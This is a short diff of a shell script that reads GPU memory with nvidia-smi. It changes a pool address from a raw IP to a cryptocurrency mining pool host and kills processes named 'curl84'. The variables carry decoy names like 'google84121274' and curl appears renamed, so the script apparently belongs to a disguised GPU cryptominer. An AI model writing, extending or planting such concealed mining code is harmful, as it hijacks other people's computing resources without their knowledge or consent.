@@ -17,7 +17,7 @@ do
 
 google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
-google841212121274="http://154.127.52.52"
+google841212121274="http://mine.arionumpool.com"
 
 pkill -f curl84
 
